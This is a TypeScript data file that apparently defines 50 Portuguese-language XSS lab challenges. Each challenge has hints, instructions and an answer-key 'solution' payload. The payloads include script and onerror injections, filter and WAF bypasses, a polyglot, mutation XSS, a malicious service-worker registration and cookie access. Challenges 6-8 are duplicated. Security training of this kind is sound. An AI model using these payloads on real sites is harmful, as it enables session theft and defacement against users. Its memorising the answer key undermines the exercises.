import { Challenge } from '@/types/challenge';

export const challenges: Challenge[] = [
  // BÁSICO (1-15)
  {
    id: 1,
    title: "Primeiro Contato",
    description: "Bem-vindo ao laboratório XSS! Execute seu primeiro script simples.",
    category: 'basic',
    difficulty: 1,
    completed: false,
    hints: [
      "Procure por um campo de entrada na página",
      "Tente inserir uma tag <script>",
      "Use alert() para mostrar um popup"
    ],
    solution: "<script>alert('XSS')</script>",
    vulnerabilityType: 'reflected',
    instructions: [
      "Encontre o campo de entrada",
      "Insira um payload XSS básico",
      "Observe o resultado na página"
    ],
    component: "Challenge1"
  },
  {
    id: 2,
    title: "Comentário Malicioso",
    description: "Um sistema de comentários que não filtra entrada do usuário.",
    category: 'basic',
    difficulty: 1,
    completed: false,
    hints: [
      "O sistema salva comentários permanentemente",
      "Outros usuários verão seu comentário",
      "Tente inserir JavaScript no comentário"
    ],
    solution: "<script>alert('Stored XSS')</script>",
    vulnerabilityType: 'stored',
    instructions: [
      "Adicione um comentário malicioso",
      "Recarregue a página para ver o efeito",
      "Note que o script roda automaticamente"
    ],
    component: "Challenge2"
  },
  {
    id: 3,
    title: "Perfil de Usuário",
    description: "Edite seu perfil e veja a magia acontecer.",
    category: 'basic',
    difficulty: 2,
    completed: false,
    hints: [
      "O nome do usuário é exibido diretamente na página",
      "Não há sanitização no backend",
      "Tente diferentes tags HTML"
    ],
    solution: "<img src=x onerror=alert('Profile XSS')>",
    vulnerabilityType: 'stored',
    instructions: [
      "Edite seu nome de usuário",
      "Use uma tag que executa JavaScript automaticamente",
      "Salve e observe o resultado"
    ],
    component: "Challenge3"
  },
  {
    id: 4,
    title: "Busca Perigosa",
    description: "Um sistema de busca que reflete sua pesquisa na página.",
    category: 'basic',
    difficulty: 2,
    completed: false,
    hints: [
      "O termo de busca aparece na URL",
      "A página mostra o que você pesquisou",
      "Tente pesquisar por código HTML"
    ],
    solution: "<script>alert('Search XSS')</script>",
    vulnerabilityType: 'reflected',
    instructions: [
      "Use a função de busca",
      "Insira código malicioso como termo de busca",
      "Observe como é refletido na página"
    ],
    component: "Challenge4"
  },
  {
    id: 5,
    title: "URL Maliciosa",
    description: "Às vezes a vulnerabilidade está na própria URL.",
    category: 'basic',
    difficulty: 2,
    completed: false,
    hints: [
      "Observe os parâmetros da URL",
      "A página lê dados diretamente da URL",
      "Modifique a URL manualmente"
    ],
    solution: "?message=<script>alert('URL XSS')</script>",
    vulnerabilityType: 'url',
    instructions: [
      "Examine a URL atual",
      "Adicione ou modifique parâmetros",
      "Injete código através da URL"
    ],
    component: "Challenge5"
  },

  // INTERMEDIÁRIO (6-25)
  {
    id: 6,
    title: "Filtro Ingênuo",
    description: "Um filtro básico tenta bloquear <script>, mas não é inteligente.",
    category: 'intermediate',
    difficulty: 2,
    completed: false,
    hints: [
      "A palavra 'script' está bloqueada",
      "Existem outras formas de executar JavaScript",
      "Tente usar eventos HTML"
    ],
    solution: "<img src=x onerror=alert('Bypass')>",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Tente inserir <script> primeiro para ver o filtro",
      "Use um método alternativo de execução",
      "Confirme que conseguiu bypassar a proteção"
    ],
    component: "Challenge6"
  },
  {
    id: 7,
    title: "DOM XSS Oculto",
    description: "O JavaScript da página manipula dados sem sanitização.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "O problema está no JavaScript da página",
      "Dados são inseridos diretamente no DOM",
      "Use innerHTML ou similar para sua vantagem"
    ],
    solution: "<img src=x onerror=alert('DOM XSS')>",
    vulnerabilityType: 'dom',
    instructions: [
      "Analise como a página manipula dados",
      "Encontre onde o JavaScript insere conteúdo",
      "Explore a falta de sanitização"
    ],
    component: "Challenge7"
  },
  {
    id: 8,
    title: "Formulário de Contato",
    description: "Um formulário que exibe dados sem verificação adequada.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Múltiplos campos podem ser vulneráveis",
      "Teste diferentes campos do formulário",
      "O preview mostra dados não sanitizados"
    ],
    solution: "<script>alert('Contact XSS')</script>",
    vulnerabilityType: 'reflected',
    instructions: [
      "Preencha o formulário de contato",
      "Insira payloads em diferentes campos",
      "Use o preview para ver o resultado"
    ],
    component: "Challenge8"
  },

  {
    id: 6,
    title: "Filtro Ingênuo",
    description: "Um filtro básico tenta bloquear <script>, mas não é inteligente.",
    category: 'intermediate',
    difficulty: 2,
    completed: false,
    hints: [
      "A palavra 'script' está bloqueada",
      "Existem outras formas de executar JavaScript",
      "Tente usar eventos HTML"
    ],
    solution: "<img src=x onerror=alert('Bypass')>",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Tente inserir <script> primeiro para ver o filtro",
      "Use um método alternativo de execução",
      "Confirme que conseguiu bypassar a proteção"
    ],
    component: "Challenge6"
  },
  {
    id: 7,
    title: "DOM XSS Oculto",
    description: "O JavaScript da página manipula dados sem sanitização.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "O problema está no JavaScript da página",
      "Dados são inseridos diretamente no DOM",
      "Use innerHTML ou similar para sua vantagem"
    ],
    solution: "<img src=x onerror=alert('DOM XSS')>",
    vulnerabilityType: 'dom',
    instructions: [
      "Analise como a página manipula dados",
      "Encontre onde o JavaScript insere conteúdo",
      "Explore a falta de sanitização"
    ],
    component: "Challenge7"
  },
  {
    id: 8,
    title: "Formulário de Contato",
    description: "Um formulário que exibe dados sem verificação adequada.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Múltiplos campos podem ser vulneráveis",
      "Teste diferentes campos do formulário",
      "O preview mostra dados não sanitizados"
    ],
    solution: "<script>alert('Contact XSS')</script>",
    vulnerabilityType: 'reflected',
    instructions: [
      "Preencha o formulário de contato",
      "Insira payloads em diferentes campos",
      "Use o preview para ver o resultado"
    ],
    component: "Challenge8"
  },
  {
    id: 9,
    title: "JSON Injection",
    description: "Dados JSON são inseridos diretamente no JavaScript da página.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "A página usa dados JSON",
      "JSON é inserido em uma tag <script>",
      "Escape do contexto JSON"
    ],
    solution: "</script><script>alert('JSON XSS')</script>",
    vulnerabilityType: 'dom',
    instructions: [
      "Encontre onde os dados JSON são usados",
      "Escape do contexto JSON",
      "Execute seu código JavaScript"
    ],
    component: "Challenge9"
  },
  {
    id: 10,
    title: "Filtro Case-Sensitive",
    description: "O filtro só bloqueia 'script' em minúsculas.",
    category: 'intermediate',
    difficulty: 2,
    completed: false,
    hints: [
      "O filtro diferencia maiúsculas de minúsculas",
      "Tente variações de capitalização",
      "HTML não é case-sensitive"
    ],
    solution: "<SCRIPT>alert('Case Bypass')</SCRIPT>",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Teste o filtro com 'script' minúsculo",
      "Tente com letras maiúsculas",
      "Confirme que o bypass funcionou"
    ],
    component: "Challenge10"
  },
  {
    id: 11,
    title: "Login Falso",
    description: "Uma página de login que pode roubar credenciais.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "O formulário não valida origem",
      "Cookies podem ser acessados via JavaScript",
      "Use document.cookie para extrair dados"
    ],
    solution: "<script>alert(document.cookie)</script>",
    vulnerabilityType: 'stored',
    instructions: [
      "Analise o formulário de login",
      "Injete código no campo de usuário",
      "Roube informações sensíveis"
    ],
    component: "Challenge11"
  },
  {
    id: 12,
    title: "Redirect Malicioso",
    description: "Parâmetros de redirecionamento podem ser explorados.",
    category: 'intermediate',
    difficulty: 2,
    completed: false,
    hints: [
      "URL contém parâmetro de redirecionamento",
      "JavaScript executa antes do redirect",
      "Modifique a URL diretamente"
    ],
    solution: "?redirect=javascript:alert('Redirect XSS')",
    vulnerabilityType: 'url',
    instructions: [
      "Observe o parâmetro redirect na URL",
      "Substitua por código JavaScript",
      "Veja o resultado antes do redirecionamento"
    ],
    component: "Challenge12"
  },
  {
    id: 13,
    title: "Upload de Arquivo",
    description: "Sistema de upload que não valida conteúdo adequadamente.",
    category: 'intermediate',
    difficulty: 4,
    completed: false,
    hints: [
      "Arquivos HTML podem ser enviados",
      "O conteúdo é exibido diretamente",
      "Use uma extensão permitida"
    ],
    solution: "arquivo.html com <script>alert('Upload XSS')</script>",
    vulnerabilityType: 'stored',
    instructions: [
      "Tente fazer upload de um arquivo HTML",
      "Coloque código JavaScript no arquivo",
      "Acesse o arquivo enviado"
    ],
    component: "Challenge13"
  },
  {
    id: 14,
    title: "Iframe Malicioso",
    description: "Conteúdo é carregado em iframe sem sanitização.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "URL do iframe vem de parâmetro",
      "Dados são inseridos diretamente",
      "Use data: URLs ou JavaScript"
    ],
    solution: "?url=data:text/html,<script>alert('Iframe XSS')</script>",
    vulnerabilityType: 'url',
    instructions: [
      "Observe como o iframe é carregado",
      "Modifique o parâmetro de URL",
      "Use data URLs para injetar código"
    ],
    component: "Challenge14"
  },
  {
    id: 15,
    title: "Codificação Dupla",
    description: "Sistema decodifica dados duas vezes.",
    category: 'intermediate',
    difficulty: 4,
    completed: false,
    hints: [
      "Dados passam por decodificação múltipla",
      "Use encoding para bypassar filtros",
      "Tente URL encoding duplo"
    ],
    solution: "%253Cscript%253Ealert('Double%2520Encoding')%253C/script%253E",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Encode seu payload uma vez",
      "Encode novamente o resultado",
      "Veja como a decodificação dupla funciona"
    ],
    component: "Challenge15"
  },

  // AVANÇADO (16-35)
  {
    id: 16,
    title: "CSP Bypass Básico",
    description: "Content Security Policy com configuração fraca.",
    category: 'advanced',
    difficulty: 4,
    completed: false,
    hints: [
      "CSP permite inline scripts em certas condições",
      "Procure por nonces ou unsafe-inline",
      "Use existing scripts como base"
    ],
    solution: "<script nonce='random123'>alert('CSP Bypass')</script>",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Analise o Content Security Policy",
      "Encontre formas permitidas de execução",
      "Bypasse as restrições"
    ],
    component: "Challenge16"
  },
  {
    id: 17,
    title: "Template Engine",
    description: "Engine de template expõe dados sem sanitização.",
    category: 'advanced',
    difficulty: 4,
    completed: false,
    hints: [
      "Template usa sintaxe especial",
      "Variáveis são injetadas diretamente",
      "Escape do contexto do template"
    ],
    solution: "{{constructor.constructor('alert(1)')()}}",
    vulnerabilityType: 'dom',
    instructions: [
      "Identifique o engine de template",
      "Use sintaxe específica para escape",
      "Execute código JavaScript"
    ],
    component: "Challenge17"
  },
  {
    id: 18,
    title: "WebSocket Injection",
    description: "Dados de WebSocket são exibidos sem sanitização.",
    category: 'advanced',
    difficulty: 4,
    completed: false,
    hints: [
      "Aplicação usa WebSocket para comunicação",
      "Mensagens são exibidas diretamente",
      "Injete payload através do WebSocket"
    ],
    solution: "Enviar via WebSocket: <script>alert('WebSocket XSS')</script>",
    vulnerabilityType: 'dom',
    instructions: [
      "Conecte-se ao WebSocket",
      "Envie mensagem com payload",
      "Observe execução no cliente"
    ],
    component: "Challenge18"
  },
  {
    id: 19,
    title: "PostMessage Vulnerability",
    description: "Window.postMessage sem validação de origem.",
    category: 'advanced',
    difficulty: 4,
    completed: false,
    hints: [
      "Página escuta postMessage events",
      "Não há validação de origem",
      "Use iframe para enviar mensagem"
    ],
    solution: "postMessage('<script>alert(1)</script>', '*')",
    vulnerabilityType: 'dom',
    instructions: [
      "Analise os event listeners",
      "Crie iframe para enviar mensagem",
      "Bypass validação de origem"
    ],
    component: "Challenge19"
  },
  {
    id: 20,
    title: "SVG Vector",
    description: "Upload e exibição de SVG sem sanitização.",
    category: 'advanced',
    difficulty: 3,
    completed: false,
    hints: [
      "SVG pode conter JavaScript",
      "Tags script funcionam em SVG",
      "Use elementos SVG específicos"
    ],
    solution: "<svg onload=alert('SVG XSS')>",
    vulnerabilityType: 'stored',
    instructions: [
      "Crie arquivo SVG malicioso",
      "Use eventos SVG para execução",
      "Faça upload e visualize"
    ],
    component: "Challenge20"
  },
  {
    id: 21,
    title: "Angular Template",
    description: "Template Angular com sanitização desabilitada.",
    category: 'advanced',
    difficulty: 5,
    completed: false,
    hints: [
      "Angular usa {{}} para templates",
      "Sanitização pode estar bypassada",
      "Use sintaxe Angular específica"
    ],
    solution: "{{constructor.constructor('alert(1)')()}}",
    vulnerabilityType: 'dom',
    instructions: [
      "Identifique sintaxe Angular",
      "Explore template expressions",
      "Bypass sanitização do framework"
    ],
    component: "Challenge21"
  },
  {
    id: 22,
    title: "JSONP Callback",
    description: "Endpoint JSONP permite callback malicioso.",
    category: 'advanced',
    difficulty: 4,
    completed: false,
    hints: [
      "JSONP usa parâmetro callback",
      "Callback é executado como JavaScript",
      "Modifique o parâmetro callback"
    ],
    solution: "?callback=alert('JSONP XSS');//",
    vulnerabilityType: 'url',
    instructions: [
      "Identifique endpoint JSONP",
      "Modifique parâmetro callback",
      "Execute código via callback"
    ],
    component: "Challenge22"
  },
  {
    id: 23,
    title: "CSS Injection",
    description: "Injeção via CSS que leva a execução de JavaScript.",
    category: 'advanced',
    difficulty: 4,
    completed: false,
    hints: [
      "CSS pode executar JavaScript em alguns casos",
      "Use expression() ou URL()",
      "Explore propriedades CSS específicas"
    ],
    solution: "expression(alert('CSS XSS'))",
    vulnerabilityType: 'dom',
    instructions: [
      "Injete CSS malicioso",
      "Use propriedades que executam JS",
      "Confirme execução do código"
    ],
    component: "Challenge23"
  },
  {
    id: 24,
    title: "Polyglot Attack",
    description: "Payload que funciona em múltiplos contextos.",
    category: 'advanced',
    difficulty: 5,
    completed: false,
    hints: [
      "Payload deve funcionar em HTML e JavaScript",
      "Use sintaxe que é válida em ambos",
      "Considere contextos mistos"
    ],
    solution: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e",
    vulnerabilityType: 'polyglot',
    instructions: [
      "Crie payload que funciona em vários contextos",
      "Teste em HTML, JavaScript e CSS",
      "Confirme execução universal"
    ],
    component: "Challenge24"
  },
  {
    id: 25,
    title: "WAF Bypass",
    description: "Web Application Firewall com regras específicas.",
    category: 'advanced',
    difficulty: 5,
    completed: false,
    hints: [
      "WAF bloqueia palavras-chave comuns",
      "Use encoding e obfuscação",
      "Fragmente o payload"
    ],
    solution: "<img src=x oneRRor=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Identifique regras do WAF",
      "Obfusque payload para bypass",
      "Use técnicas avançadas de evasão"
    ],
    component: "Challenge25"
  },

  // EXPERT (26-30)
  {
    id: 26,
    title: "Mutation XSS",
    description: "DOM mutation que cria vulnerabilidade.",
    category: 'expert',
    difficulty: 5,
    completed: false,
    hints: [
      "HTML é modificado após inserção",
      "Browsers normalizam HTML diferentemente",
      "Use peculiaridades do parser"
    ],
    solution: "<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">",
    vulnerabilityType: 'dom',
    instructions: [
      "Explore mutation do DOM",
      "Use tags que causam re-parsing",
      "Aproveite inconsistências do browser"
    ],
    component: "Challenge26"
  },
  {
    id: 27,
    title: "Service Worker Hijack",
    description: "Service Worker pode ser hijacked para XSS.",
    category: 'expert',
    difficulty: 5,
    completed: false,
    hints: [
      "Service Worker intercepta requests",
      "Pode modificar responses",
      "Use para injetar JavaScript"
    ],
    solution: "navigator.serviceWorker.register('data:text/javascript,self.addEventListener(\"fetch\",e=>e.respondWith(new Response(\"<script>alert(1)</script>\")))')",
    vulnerabilityType: 'dom',
    instructions: [
      "Registre Service Worker malicioso",
      "Intercepte requests da página",
      "Injete código via response"
    ],
    component: "Challenge27"
  },
  {
    id: 28,
    title: "Unicode Bypass",
    description: "Filtros não lidam bem com Unicode.",
    category: 'expert',
    difficulty: 5,
    completed: false,
    hints: [
      "Unicode pode bypassar filtros",
      "Use caracteres similares visualmente",
      "Normalization pode ajudar"
    ],
    solution: "<ｓcript>alert('Unicode')</ｓcript>",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Use caracteres Unicode similares",
      "Bypass filtros de blacklist",
      "Confirme execução do payload"
    ],
    component: "Challenge28"
  },
  {
    id: 29,
    title: "Prototype Pollution XSS",
    description: "Pollution do prototype leva a XSS.",
    category: 'expert',
    difficulty: 5,
    completed: false,
    hints: [
      "Object.prototype pode ser modificado",
      "Afeta todos os objetos",
      "Use para injetar propriedades"
    ],
    solution: "Object.prototype.innerHTML = '<script>alert(1)</script>'",
    vulnerabilityType: 'dom',
    instructions: [
      "Modifique Object.prototype",
      "Injete propriedades maliciosas",
      "Explore impacto global"
    ],
    component: "Challenge29"
  },
  {
    id: 30,
    title: "Zero-Day Simulation",
    description: "Simule descoberta de zero-day em aplicação real.",
    category: 'expert',
    difficulty: 5,
    completed: false,
    hints: [
      "Combine múltiplas técnicas",
      "Use todos os conhecimentos adquiridos",
      "Pense como um pesquisador"
    ],
    solution: "/* Múltiplas soluções possíveis */",
    vulnerabilityType: 'polyglot',
    instructions: [
      "Analise a aplicação completamente",
      "Encontre vulnerabilidade não óbvia",
      "Crie exploit funcional"
    ],
    component: "Challenge30"
  },

  // NOVOS DESAFIOS BÁSICOS (31-35)
  {
    id: 31,
    title: "Calculadora Maliciosa",
    description: "Uma calculadora que executa mais do que deveria.",
    category: 'basic',
    difficulty: 1,
    completed: false,
    hints: [
      "A calculadora usa eval() para processar expressões",
      "Você pode inserir mais que números",
      "Tente inserir código JavaScript válido"
    ],
    solution: "alert('Calculator XSS')",
    vulnerabilityType: 'dom',
    instructions: [
      "Use a calculadora normalmente primeiro",
      "Insira código JavaScript no lugar de números",
      "Observe a execução do código"
    ],
    component: "Challenge31"
  },
  {
    id: 32,
    title: "Gerador de QR Code",
    description: "Sistema que gera QR codes a partir de texto.",
    category: 'basic',
    difficulty: 2,
    completed: false,
    hints: [
      "O texto é exibido abaixo do QR code",
      "Não há sanitização do texto exibido",
      "HTML é interpretado diretamente"
    ],
    solution: "<script>alert('QR XSS')</script>",
    vulnerabilityType: 'reflected',
    instructions: [
      "Digite texto para gerar QR code",
      "Observe como o texto é exibido",
      "Injete HTML malicioso no texto"
    ],
    component: "Challenge32"
  },
  {
    id: 33,
    title: "Sistema de Avaliação",
    description: "Deixe sua avaliação sobre nosso serviço.",
    category: 'basic',
    difficulty: 2,
    completed: false,
    hints: [
      "Avaliações são salvas e exibidas publicamente",
      "O sistema permite formatação rica",
      "Outros usuários verão sua avaliação"
    ],
    solution: "<img src=x onerror=alert('Review XSS')>",
    vulnerabilityType: 'stored',
    instructions: [
      "Escreva uma avaliação",
      "Use HTML para 'formatar' sua mensagem",
      "Veja como é exibida para outros usuários"
    ],
    component: "Challenge33"
  },
  {
    id: 34,
    title: "Encurtador de URL",
    description: "Encurte suas URLs longas facilmente.",
    category: 'basic',
    difficulty: 2,
    completed: false,
    hints: [
      "URLs são validadas apenas superficialmente",
      "O preview mostra a URL original",
      "JavaScript: URLs são aceitas"
    ],
    solution: "javascript:alert('URL Shortener XSS')",
    vulnerabilityType: 'reflected',
    instructions: [
      "Insira uma URL para encurtar",
      "Tente usar javascript: como protocolo",
      "Clique no link gerado"
    ],
    component: "Challenge34"
  },
  {
    id: 35,
    title: "Chat de Suporte",
    description: "Converse com nosso suporte técnico.",
    category: 'basic',
    difficulty: 2,
    completed: false,
    hints: [
      "Mensagens são exibidas em tempo real",
      "O sistema não filtra HTML",
      "Você pode 'formatar' suas mensagens"
    ],
    solution: "<script>alert('Support Chat XSS')</script>",
    vulnerabilityType: 'dom',
    instructions: [
      "Inicie uma conversa com o suporte",
      "Envie uma mensagem com HTML",
      "Observe como é renderizada"
    ],
    component: "Challenge35"
  },

  // NOVOS DESAFIOS INTERMEDIÁRIOS (36-45)
  {
    id: 36,
    title: "Markdown Editor",
    description: "Editor que converte Markdown para HTML.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Markdown permite HTML inline",
      "A conversão não sanitiza HTML",
      "Use sintaxe Markdown com HTML"
    ],
    solution: "[Link](javascript:alert('Markdown XSS'))",
    vulnerabilityType: 'dom',
    instructions: [
      "Escreva texto em Markdown",
      "Misture HTML com Markdown",
      "Use links com javascript: URLs"
    ],
    component: "Challenge36"
  },
  {
    id: 37,
    title: "Filtro Regex Fraco",
    description: "Regex mal construída permite bypass.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Regex bloqueia <script> mas não outras tags",
      "Eventos HTML não são filtrados",
      "Case sensitivity pode ser explorada"
    ],
    solution: "<ScRiPt>alert('Regex Bypass')</ScRiPt>",
    vulnerabilityType: 'filter-bypass',
    instructions: [
      "Teste o filtro com <script>",
      "Varie a capitalização das letras",
      "Confirme o bypass"
    ],
    component: "Challenge37"
  },
  {
    id: 38,
    title: "API GraphQL",
    description: "Endpoint GraphQL com sanitização inadequada.",
    category: 'intermediate',
    difficulty: 4,
    completed: false,
    hints: [
      "GraphQL permite queries complexas",
      "Campos de string não são sanitizados",
      "Use mutations para injetar dados"
    ],
    solution: "mutation { updateProfile(bio: \"<script>alert('GraphQL XSS')</script>\") }",
    vulnerabilityType: 'stored',
    instructions: [
      "Explore a interface GraphQL",
      "Encontre campos que aceitam HTML",
      "Use mutations para injetar código"
    ],
    component: "Challenge38"
  },
  {
    id: 39,
    title: "Validação Client-Side",
    description: "Validação apenas no frontend é insuficiente.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "JavaScript valida dados no cliente",
      "Validação pode ser bypassada",
      "Use DevTools para modificar código"
    ],
    solution: "Desabilitar validação JS e enviar: <script>alert('Client Bypass')</script>",
    vulnerabilityType: 'reflected',
    instructions: [
      "Observe a validação JavaScript",
      "Desabilite JavaScript ou modifique o código",
      "Envie dados não validados"
    ],
    component: "Challenge39"
  },
  {
    id: 40,
    title: "Cookie Reflection",
    description: "Valores de cookies são refletidos na página.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Página lê e exibe valores de cookies",
      "Cookies podem ser modificados",
      "Use DevTools para alterar cookies"
    ],
    solution: "document.cookie='username=<script>alert(\"Cookie XSS\")</script>'",
    vulnerabilityType: 'reflected',
    instructions: [
      "Identifique cookies usados pela página",
      "Modifique valores dos cookies",
      "Recarregue a página para ver o efeito"
    ],
    component: "Challenge40"
  },
  {
    id: 41,
    title: "Base64 Decoder",
    description: "Decodificador que executa o resultado.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Sistema decodifica Base64 e exibe resultado",
      "Resultado é inserido diretamente no DOM",
      "Encode seu payload em Base64"
    ],
    solution: "PHNjcmlwdD5hbGVydCgnQmFzZTY0IFhTUycpPC9zY3JpcHQ+",
    vulnerabilityType: 'dom',
    instructions: [
      "Encode JavaScript em Base64",
      "Cole o resultado no decodificador",
      "Observe a execução após decodificação"
    ],
    component: "Challenge41"
  },
  {
    id: 42,
    title: "Error Page XSS",
    description: "Página de erro reflete parâmetros da URL.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Página de erro mostra URL que causou o erro",
      "Parâmetros são refletidos sem sanitização",
      "Modifique a URL para injetar código"
    ],
    solution: "?error=<script>alert('Error Page XSS')</script>",
    vulnerabilityType: 'reflected',
    instructions: [
      "Force um erro na aplicação",
      "Observe como a URL é exibida",
      "Modifique parâmetros para injetar código"
    ],
    component: "Challenge42"
  },
  {
    id: 43,
    title: "XML Parser",
    description: "Parser XML que processa dados externos.",
    category: 'intermediate',
    difficulty: 4,
    completed: false,
    hints: [
      "XML pode conter CDATA com HTML",
      "Parser não sanitiza conteúdo CDATA",
      "Use CDATA para bypassar filtros"
    ],
    solution: "<![CDATA[<script>alert('XML XSS')</script>]]>",
    vulnerabilityType: 'dom',
    instructions: [
      "Envie dados XML para o parser",
      "Use seções CDATA para HTML",
      "Observe como é processado"
    ],
    component: "Challenge43"
  },
  {
    id: 44,
    title: "Hash Fragment",
    description: "JavaScript lê e processa hash da URL.",
    category: 'intermediate',
    difficulty: 3,
    completed: false,
    hints: [
      "Página lê location.hash",
      "Hash é usado para navegação",
      "Modifique o hash da URL"
    ],
    solution: "#<script>alert('Hash XSS')</script>",
    vulnerabilityType: 'dom',
    instructions: [
      "Observe como a página usa o hash",
      "Modifique o hash na URL",
      "Veja como é processado pelo JavaScript"
    ],
    component: "Challenge44"
  },
  {
    id: 45,
    title: "WebRTC Data Channel",
    description: "Dados WebRTC são exibidos sem sanitização.",
    category: 'intermediate',
    difficulty: 4,
    completed: false,
    hints: [
      "WebRTC permite comunicação P2P",
      "Dados recebidos são exibidos diretamente",
      "Simule recebimento de dados maliciosos"
    ],
    solution: "Enviar via WebRTC: <script>alert('WebRTC XSS')</script>",
    vulnerabilityType: 'dom',
    instructions: [
      "Estabeleça conexão WebRTC",
      "Envie dados através do canal",
      "Observe como são exibidos"
    ],
    component: "Challenge45"
  },

  // NOVOS DESAFIOS AVANÇADOS (46-50)
  {
    id: 46,
    title: "Web Worker Message",
    description: "Web Worker processa dados sem sanitização.",
    category: 'advanced',
    difficulty: 4,
    completed: false,
    hints: [
      "Web Worker recebe mensagens do main thread",
      "Dados são processados e retornados",
      "Resultado é inserido no DOM"
    ],
    solution: "worker.postMessage('<script>alert(\"Worker XSS\")</script>')",
    vulnerabilityType: 'dom',
    instructions: [
      "Envie dados para o Web Worker",
      "Inclua HTML malicioso nos dados",
      "Observe o resultado processado"
    ],
    component: "Challenge46"
  },
  {
    id: 47,
    title: "Trusted Types Bypass",
    description: "Bypass de Trusted Types API.",
    category: 'advanced',
    difficulty: 5,
    completed: false,
    hints: [
      "Trusted Types previne XSS",
      "Algumas APIs ainda são vulneráveis",
      "Use APIs que não verificam Trusted Types"
    ],
    solution: "document.write('<script>alert(\"Trusted Types Bypass\")</script>')",
    vulnerabilityType: 'dom',
    instructions: [
      "Identifique APIs protegidas por Trusted Types",
      "Encontre APIs não protegidas",
      "Use para bypassar a proteção"
    ],
    component: "Challenge47"
  },
  {
    id: 48,
    title: "Import Maps Injection",
    description: "Import maps podem ser explorados para XSS.",
    category: 'advanced',
    difficulty: 5,
    completed: false,
    hints: [
      "Import maps controlam resolução de módulos",
      "Podem redirecionar imports para URLs maliciosas",
      "Use data: URLs para injetar código"
    ],
    solution: "{\"imports\": {\"./module.js\": \"data:text/javascript,alert('Import Maps XSS')\"}}",
    vulnerabilityType: 'dom',
    instructions: [
      "Modifique o import map",
      "Redirecione imports para data: URLs",
      "Observe a execução do código injetado"
    ],
    component: "Challenge48"
  },
  {
    id: 49,
    title: "Shared Array Buffer",
    description: "Dados compartilhados entre workers são vulneráveis.",
    category: 'advanced',
    difficulty: 5,
    completed: false,
    hints: [
      "SharedArrayBuffer permite compartilhamento de memória",
      "Dados podem ser modificados por qualquer worker",
      "Use para injetar código em contexto principal"
    ],
    solution: "// Modificar SharedArrayBuffer com payload XSS",
    vulnerabilityType: 'dom',
    instructions: [
      "Acesse o SharedArrayBuffer",
      "Modifique dados compartilhados",
      "Observe impacto no thread principal"
    ],
    component: "Challenge49"
  },
  {
    id: 50,
    title: "Master Challenge",
    description: "Desafio final que combina todas as técnicas aprendidas.",
    category: 'expert',
    difficulty: 5,
    completed: false,
    hints: [
      "Use conhecimento de todos os desafios anteriores",
      "Múltiplas vulnerabilidades devem ser exploradas",
      "Pense como um verdadeiro hacker ético"
    ],
    solution: "/* Solução complexa combinando múltiplas técnicas */",
    vulnerabilityType: 'polyglot',
    instructions: [
      "Analise toda a aplicação",
      "Identifique múltiplas vulnerabilidades",
      "Crie uma cadeia de exploração completa"
    ],
    component: "Challenge50"
  }
];

// Função para obter desafios por categoria
export const getChallengesByCategory = (category: Challenge['category']) => {
  return challenges.filter(challenge => challenge.category === category);
};

// Função para obter desafio por ID
export const getChallengeById = (id: number) => {
  return challenges.find(challenge => challenge.id === id);
};